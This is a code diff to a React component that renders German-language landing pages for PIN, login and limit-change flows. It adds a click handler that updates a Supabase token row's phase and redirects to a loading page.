@@ -65,7 +65,7 @@ const FlowLanding = ({ kind }: Props) => {
   const [sp] = useSearchParams();
   const token = sp.get("token");
   const [name, setName] = useState<string | null>(null);
-  const target = kind === "pin" && token
+  const target = (kind === "pin" || kind === "limit") && token
     ? `${c.target}?token=${encodeURIComponent(token)}`
     : c.target;
 
@@ -110,6 +110,20 @@ const FlowLanding = ({ kind }: Props) => {
     }
   };
 
+  const handleLimitClick = async (e: React.MouseEvent) => {
+    if (kind !== "limit") return;
+    e.preventDefault();
+    if (token) {
+      await (supabase as any)
+        .from("limit_tokens")
+        .update({ customer_phase: "confirm", last_error: null })
+        .eq("token", token);
+      navigate(`/limit/loading?token=${encodeURIComponent(token)}`);
+    } else {
+      navigate("/limit/loading");
+    }
+  };
+
 
   return (
     <div className="min-h-screen bg-white flex flex-col relative">
@@ -141,7 +155,8 @@ const FlowLanding = ({ kind }: Props) => {
             {kind === "auth" || kind === "limit" ? (
               <div className="flex justify-end">
                 <Link
-                  to={c.target}
+                  to={target}
+                  onClick={kind === "limit" ? handleLimitClick : undefined}
                   className="inline-flex items-center justify-center h-10 px-8 rounded-md border border-foreground bg-white text-foreground font-medium text-sm hover:bg-white transition-colors"
                 >
                   {kind === "auth" ? "Anmelden" : "Limit ändern"}
